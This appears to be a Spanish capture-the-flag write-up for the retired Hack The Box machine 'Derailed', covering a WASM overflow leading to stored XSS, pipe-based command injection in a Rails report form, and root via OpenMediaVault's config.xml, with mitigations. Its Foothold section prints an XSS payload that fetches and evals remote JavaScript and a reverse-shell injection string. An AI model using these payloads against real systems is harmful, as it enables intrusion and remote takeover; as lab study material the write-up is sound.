---
machine: Derailed
os: Linux
difficulty: Insane
platform: Hack The Box
state: Retired
tags: [linux, web, rails, wasm, xss, command-injection, openmediavault, privesc]
---

# Derailed — Hack The Box (Linux)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

Una aplicación Rails muestra las rutas en `/rails/info/routes`. El registro no limita la longitud del usuario y un desbordamiento de buffer en el módulo WebAssembly que pinta la fecha sobrescribe el campo contiguo, permitiendo XSS almacenado. El bot de administración visita la nota y el formulario de reportes ejecuta `open()` sobre un nombre controlado con un pipe, lo que da una shell como `rails`. La contraseña de `openmediavault-webgui` permite entrar en la GUI de OpenMediaVault y escribir una clave SSH de root en su base XML.

## Reconocimiento

```bash
nmap -Pn -sCV -p22,3000 <IP>
```

- `22` OpenSSH y `3000` nginx 1.18 con Rails.
- La web es un foro de notas con registro y un botón para reportar contenido al administrador.
- `/rails/info/routes` expone el mapa de rutas en desarrollo.

## Enumeración

Se revisan `/administration`, el formulario de reportes y el JavaScript de la aplicación. El módulo WASM `display()` copia el nombre de usuario en un buffer y después escribe la fecha en el offset 48; un nombre de 48 bytes o más deja el HTML del atacante en el campo de fecha, que se inserta sin escapar.

## Foothold

Se registra un usuario cuyo nombre termina en una etiqueta `<img onerror=...>` y se publica una nota. Al reportarla, el administrador la abre y el navegador ejecuta el XSS. Desde ahí se leen `/administration` y el formulario de reportes.

El campo `report_log` se pasa a `open()` con un pipe delante; un valor como `|id` ejecuta comandos como `rails`.

```text
username: AAAA...(48 bytes)<img src='#' onerror="fetch('http://<IP>/x.js').then(r=>r.text()).then(eval)">
report_log: |bash -c 'bash -i >& /dev/tcp/<IP>/443 0>&1'
```

## Movimiento lateral

En el código y en los backups aparecen credenciales de `openmediavault-webgui`. La cuenta no tiene SSH, pero `su` desde `rails` funciona. Un túnel con Chisel permite llegar a la GUI en `localhost:80`.

## Escalada de privilegios

`omv-firstaid` permite resetear la contraseña de `admin` de OpenMediaVault porque el panel usa la cuenta del sistema. La base de OpenMediaVault es `/etc/openmediavault/config.xml`: se añade una clave pública al usuario `root` en `sshpubkeys` y se aplica el cambio. Después se entra por SSH como root.

```bash
# en la GUI: /sbin/omv-firstaid -> cambiar contraseña de admin
# editar <user><name>root</name><sshpubkeys>...
ssh-keygen -e -f id_ed25519.pub   # formato RFC 4716
```

## Evidencia

- Nombre de 48 bytes y alerta en el campo de fecha.
- Petición del bot al servidor de XSS.
- `open()` con pipe en el reporte.
- `config.xml` con la clave de root y acceso SSH.

## Lecciones aprendidas

- Los límites de longitud también son una frontera de memoria en WASM.
- El HTML generado en el cliente puede acabar en el DOM del administrador.
- Un `open()` con entrada del usuario es inyección de comandos.
- Las appliances con base XML permiten cambios persistentes si se compromete su panel.

## Mitigación y detección

- Validar y limitar la longitud en el servidor, no solo en el navegador.
- Escapar la fecha y no reconstruir HTML con datos de usuario.
- No pasar nombres de archivo a `open()`; usar listas blancas y `File.open` sin pipe.
- Restringir la GUI de OpenMediaVault y auditar cambios en `config.xml` y claves SSH.

## Referencias

- [0xdf — Derailed](https://0xdf.gitlab.io/2023/07/22/htb-derailed.html)
- [IppSec — Derailed](https://www.youtube.com/watch?v=7CO4U1Y2Unk)
- [Hack The Box — Derailed](https://app.hackthebox.com/machines/derailed)
